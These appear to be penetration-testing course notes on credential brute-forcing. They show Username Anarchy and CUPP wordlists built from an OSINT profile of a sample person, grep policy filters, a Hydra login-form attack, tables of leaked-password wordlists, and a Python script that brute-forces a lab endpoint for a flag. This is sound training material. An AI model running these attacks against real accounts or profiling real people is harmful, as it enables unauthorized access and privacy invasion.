# Custom Wordlists
## Username Anarchy
This tool creates all different possibilities of a username from a users first and last name.

This is where `Username Anarchy` shines. It accounts for initials, common substitutions, and more, casting a wider net in your quest to uncover the target's username:
```bash
./username-anarchy -l
```

First, install ruby, and then pull the `Username Anarchy` git to get the script:
```bash
sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy
```

Next, execute it with the target's first and last names. This will generate possible username combinations.
```bash
./username-anarchy Jane Smith > jane_smith_usernames.txt
```
Upon inspecting `jane_smith_usernames.txt`, you'll encounter a diverse array of usernames, encompassing basic combinations, initials, etc.
## CUPP (Common User Passwords Profiler) 
CUPP (Common User Passwords Profiler) is a tool designed to create highly personalized password wordlists that leverage the gathered intelligence about your target.

Let's continue our exploration with Jane Smith. We've already employed `Username Anarchy` to generate a list of potential usernames. Now, let's use CUPP to complement this with a targeted password list.

Provide as much information as possible; CUPP's effectiveness hinges on the depth of your intelligence. Discover as many variables about this person through OSINT.

For example, let's say you have put together this profile based on Jane Smith's Facebook postings.
- |Name | Jane Smith|
- |Nickname | Janey|
- |Birthdate | December 11, 1990|
- |Relationship Status | In a relationship with Jim|
- |Partner's Name | Jim (Nickname: Jimbo)|
- |Partner's Birthdate | December 12, 1990|
- |Pet | Spot|
- |Company | AHI|
- |Interests | Hackers, Pizza, Golf, Horses|
- |Favorite Colors | Blue|

CUPP will then take your inputs and create a comprehensive list of potential passwords. This process results in a highly personalized wordlist, significantly more likely to contain Jane's actual password than any generic, off-the-shelf dictionary could ever hope to achieve.

To install CUPP:
```bash
sudo apt install cupp -y
```

Invoke CUPP in interactive mode, CUPP will guide you through a series of questions about your target, enter the following as prompted:
```bash
cupp -i
```
### Password Policies
CUPP has generated many possible passwords for us, but Jane's company, AHI, has a rather odd password policy.

- Minimum Length: 6 characters
- Must Include:
    - At least one uppercase letter
    - At least one lowercase letter
    - At least one number
    - At least two special characters (from the set `!@#$%^&*`)

As we did earlier, we can use grep to filter that password list to match that policy:
```bash
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

Now we can use the two generated lists in Hydra against the target to brute-force the login form:
```bash
hydra -L usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```
# Pre-Made Wordlists
## Building and Utilizing Wordlists
Here is a table of some of the more useful wordlists for login brute-forcing:

| Wordlist                                    | Description                                                                                      | Typical Use                                        | Source                                                                                                                           |
| ------------------------------------------- | ------------------------------------------------------------------------------------------------ | -------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| `rockyou.txt`                               | A popular password wordlist containing millions of passwords leaked from the RockYou breach.     | Commonly used for password brute force attacks.    | [RockYou breach dataset](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)                      |
| `top-usernames-shortlist.txt`               | A concise list of the most common usernames.                                                     | Suitable for quick brute force username attempts.  | [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt)                         |
| `xato-net-10-million-usernames.txt`         | A more extensive list of 10 million usernames.                                                   | Used for thorough username brute forcing.          | [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt)                   |
| `2023-200_most_used_passwords.txt`          | A list of the 200 most commonly used passwords as of 2023.                                       | Effective for targeting commonly reused passwords. | [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt) |
| `Default-Credentials/default-passwords.txt` | A list of default usernames and passwords commonly used in routers, software, and other devices. | Ideal for trying default credentials.              | [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.txt)           |
Below is an example code of a python script using a wordlist and trying every word against the password field of a target:
```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

# Try each password from the list
for password in passwords:
    print(f"Attempted password: {password}")

    # Send a POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check if the server responds with success and contains the 'flag'
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```
